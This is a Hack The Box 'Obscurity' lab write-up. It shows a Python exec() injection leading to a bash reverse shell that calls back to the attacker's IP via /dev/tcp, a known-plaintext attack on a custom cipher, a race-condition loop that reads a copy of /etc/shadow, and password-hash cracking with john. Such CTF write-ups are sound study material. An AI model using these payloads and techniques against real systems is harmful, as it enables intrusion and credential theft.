---
layout: post
title: "Hack The Box - Obscurity Writeup"
author: Chr0x6eOs
date: "2020-05-09"
subject: "Obscurity Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Linux, Crypto]
lang: "en"
titlepage: true
image:
    path: assets/htb/Obscurity/logo.png
    width: 300
    height: 300
...

# Overview
![Obscurity Image](/assets/htb/Obscurity/obscurity.png)

[Obscurity](https://www.hackthebox.eu/home/machines/profile/219) is a medium linux box by [clubby789](https://www.hackthebox.eu/home/users/profile/83743).


The box starts with web-enumeration, where we have to fuzz for a secret diretory to leak the source code of the server. Analyzing the source code, we see that the exec function is called with user-input, which leads to code-execution and gives us a shell in the context of www-data. Enumerating the system, we find that the password of the user is saved in an encrypted form. The encryption script is vulnerable to known-plaintext attack, which we can exploit to get the encryption key. With the key, we can decrypt the password and login as user.
For root, we find a custom ssh script, that temporarly copies the shadow file to /tmp/. With this we have a race-condition to read the shadow and crack the root password.

# Information Gathering

## Nmap
We begin our enumeration by running Nmap to find open ports and enumerate services.

```console
root@silence:~# nmap -sC -sV 10.10.10.168
nmap -sC -sV 10.10.10.168
Nmap scan report for 10.10.10.168
Host is up (0.050s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Wed, 06 May 2020 17:07:03
|     Server: BadHTTPServer
|     Last-Modified: Wed, 06 May 2020 17:07:03
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
[...]
```

# Enumeration
The only two open ports shown are **22** and **8080**. SSH usually is not that interesting, so let's begin with http.

## HTTP - Port 8080
Going to http://10.10.10.168:8080 a webpage is shown.

![Index webpage](/assets/htb/Obscurity/webpage-index.png)

Scrolling down on the website, we see an interesting note.

![Source hint](/assets/htb/Obscurity/webpage-src-hint.png)

The note states, that the server `SuperSecureServer.py` can be found in the secret development dir. Let us fuzz for this dir next.

### Fuzzing secret directory
```console
root@silence:~# ffuf -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v0.12
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
:: Progress: [5059/220547] :: 389 req/sec :: Duration: [0:00:13] :: Errors: 1 ::
[WARN] Caught keyboard interrupt (Ctrl-C)
```
After a couple of seconds, we find the secret directory under /develop.

Let us check out the source code at http://10.10.10.168:8080/develop/SuperSecureServer.py.

![Source code](/assets/htb/Obscurity/webpage-src-leak.png)

Let us download the server using wget:
```console
root@silence:~# wget http://10.10.10.168:8080/develop/SuperSecureServer.py
--2020-05-06 19:22:32--  http://10.10.10.168:8080/develop/SuperSecureServer.py
Connecting to 10.10.10.168:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5892 (5.8K) [text/plain]
Saving to: ‘SuperSecureServer.py’

SuperSecureServer.py          100%[===============================================>]   5.75K  --.-KB/s    in 0.001s

2020-05-06 19:22:32 (7.46 MB/s) - ‘SuperSecureServer.py’ saved [5892/5892]
```

### Analyzing the source code
Looking through the source, we can find an exec with user-supplied input.
```python
def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
	[...]
```
Exec with user-input in most cases leads to code-execution!

Let us test our assumptions locally:
```console
root@silence:~# python3
Python 3.8.2 (default, Apr  1 2020, 15:52:55)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> info = "output = 'Document: {}'"
>>> path = "'"
>>> exec(info.format(path))
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1
    output = 'Document: ''
                         ^
SyntaxError: EOL while scanning string literal
```
When we supply a ', we break the python code and get a SyntaxError. Let us try to inject python code next.

```console
root@silence:~# python3
Python 3.8.2 (default, Apr  1 2020, 15:52:55)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> info = "output = 'Document: {}'"
>>> path =" '; print('test'); x='"
>>> exec(info.format(path))
test
```
By injecting the single-quote, we terminate the format string. We can now add arbitrary python-code and then terminate the other quote by creating a variable x='. Let us test the python-code-execution on the server next.

# Abusing code-injection to get a shell
We can test code-execution on the server with a simple ping-back payload:
`';__import__('os').popen('ping -c 2 127.0.0.1').read();a='`

After url-encoding some of the characters, we can send following request:
```http
GET /';__import__('os').popen('ping%20-c%202%2010.10.14.2').read();a=' HTTP/1.1
Host: 10.10.10.168:8080
```
```console
root@silence:~# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
19:39:02.217462 IP 10.10.10.168 > silence: ICMP echo request, id 32182, seq 1, length 64
19:39:02.217488 IP silence > 10.10.10.168: ICMP echo reply, id 32182, seq 1, length 64
19:39:03.227853 IP 10.10.10.168 > silence: ICMP echo request, id 32182, seq 2, length 64
19:39:03.227870 IP silence > 10.10.10.168: ICMP echo reply, id 32182, seq 2, length 64
```
We have verified remote code execution with the ping response from the server. Let us get a shell next.

A simple bash reverse-shell should do the trick.
```python
';__import__('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"').read();a='
```

Using curl, we get a shell:
```console
root@silence:~# curl $'http://10.10.10.168:8080/\';__import__(\'os\').popen(\'bash%20-c%20%22bash%20-i%20%3E&%20/dev/tcp/10.10.14.2/443%200%3E&1%22\').read();a=\''`
```
```console
root@silence:~# nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.168.
Ncat: Connection from 10.10.10.168:46672.
www-data@obscure:/$
```
We get a shell as www-data returned. Let us quickly upgrade our shell to make working easier.

```console
www-data@obscure:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@obscure:/$ ^Z
[1]+  Stopped                 nc -lvnp 443
root@silence:~/ctf/htb/boxes/Obscurity# stty raw -echo
root@silence:~/ctf/htb/boxes/Obscurity# nc -lvnp 443

www-data@obscure:/$
```
Now with a fully working shell, we can enumerate the system and search for a privesc path.


## Privesc to user
Checking out /etc/passwd we see that we only have one user we can privesc to `robert:x:1000:1000:robert:/home/robert:/bin/bash`.

### Enumeration as www-data
Checking out the home folder of robert (/home/robert):
```console
www-data@obscure:/home/robert$ ls -alh
total 60K
-rw-rw-r-- 1 robert robert   94 Sep 26  2019 check.txt
-rw-rw-r-- 1 robert robert  185 Oct  4  2019 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4  2019 passwordreminder.txt
-rwxrwxr-x 1 robert robert 2.5K Oct  4  2019 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25  2019 user.txt
```
These files seem interesting, let us look at the SuperSecureCrypt.py file.

#### Known plaintext attack
Looking at the contents of the files in the directory, it seems like we have a plaintext and a ciphertext, generated by the SuperSecureCrypt.py script. Furthermore, we have a passwordreminder, which also seems to be encrypted by the SuperSecureCrypt.py script.
```console
root@silence:~# cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct!
root@silence:~# cat out.txt
¦ÚÈêÚÞØÛÝÝ	×ÐÊß
ÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐ
êÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäè	ÎÍÚÎëÑÓäáÛÌ×	v
```

Looking at the encryption and decryption function of the script, we can see that this seems to be a XOR like cipher.
```python
def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted
```
The situation (similar to XOR) looks like the following: (Where X is some en/decryption-operation)
```
Cipher = Plain X Key
Plain = Cipher X Key
```
We know both ciphertext and plaintext, which means if we look at this cipher like a math-equation, we have two known value and can solve by the third.
`Key =  Plain X Cipher`

Applying this knowledge to the actual script we can use a known-plaintext attack to get the key.

```console
root@silence:~# python3 SuperSecureCrypt.py -h
usage: SuperSecureCrypt.py [-h] [-i InFile] [-o OutFile] [-k Key] [-d]

Encrypt with 0bscura's encryption algorithm

optional arguments:
  -h, --help  show this help message and exit
  -i InFile   The file to read
  -o OutFile  Where to output the encrypted/decrypted file
  -k Key      Key to use
  -d          Decrypt mode
```
Ok so let us run the script with the ciphertext as the InFile and the contents of plaintext as the key.

```console
root@silence:~# python3 SuperSecureCrypt.py -i out.txt -k "$(cat check.txt)" -d -o key.txt
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file out.txt...
Decrypting...
Writing to key.txt...
root@silence:~# cat key.txt
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichai
```
We have the key now! Let us decrypt the passwordreminder.txt with this key.

```console
root@silence:~# python3 SuperSecureCrypt.py -i passwordreminder.txt -k "$(cat key.txt)" -d -o passwd.txt
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to passwd.txt...
root@silence:~# cat passwd.txt
SecThruObsFTW
```
We have successfully decrypted the passwordreminder and can now su to robert and read user.txt.

```console
www-data@obscure:/home/robert$ su robert
Password: SecThruObsFTW
robert@obscure:~$ cat user.txt
e4493***************************
```

## Privesc to root
Now that we have user, let us enumerate our newly gained privileges and search for a path to get root on this system.
### Enumeration as robert
```console
robert@obscure:~$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```
Checking our sudo privileges we seem to be allowed to run BetterSSH.py.

Let us read the source and check if we find any vulnerabilites in it.
```python
[...]
path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
[...]
with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords])
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
[...]
```
The script reads the shadow file, copies it to /tmp/SSH, checks the user submitted password and deletes the copy again.
The 0.1 second sleep gives enough time for a race-condition to read the shadow file.

#### Race-condition to root
Let us exploit the race-condition by endlessly trying to read the copy of the shadow file.
```console
robert@obscure:/tmp$ while true; do timeout 1 cat SSH/* 2>/dev/null; done
```

Let us run the SSH server in another terminal now.
```console
robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: a
Enter password: a
Invalid user
```

Checking back to the race-condition exploit we get the hashes:
```console
robert@obscure:/tmp$ while true; do timeout 1 cat SSH/* 2>/dev/null; done
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7


robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7
```
Let us copy the hash into a file and crack it using john.

#### Cracking the root password
```console
root@silence:~# cat hash.txt
root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1

root@silence:~# john hash.txt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mercedes         (root)
```
Now that we have the root password, let us su to root and read root.txt
```console
robert@obscure:~$ su
Password: mercedes
root@obscure:~# cat root.txt
512fd***************************
```